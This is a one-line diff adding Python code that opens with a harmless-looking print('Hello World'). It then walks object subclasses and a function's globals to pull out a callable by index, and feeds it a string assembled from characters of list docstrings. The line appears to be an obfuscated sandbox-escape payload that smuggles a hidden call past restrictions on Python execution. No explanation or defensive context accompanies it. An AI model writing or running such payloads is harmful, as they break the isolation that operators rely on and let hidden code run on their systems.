@@ -1,0 +1,1 @@
+print("Hello World").__class__.__mro__[1].__subclasses__()[38](().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__.values())[47]([].__doc__[54].join([].__doc__).split([].__doc__[30])[20].split([].__doc__[85])[0].lstrip([].__doc__[54]))
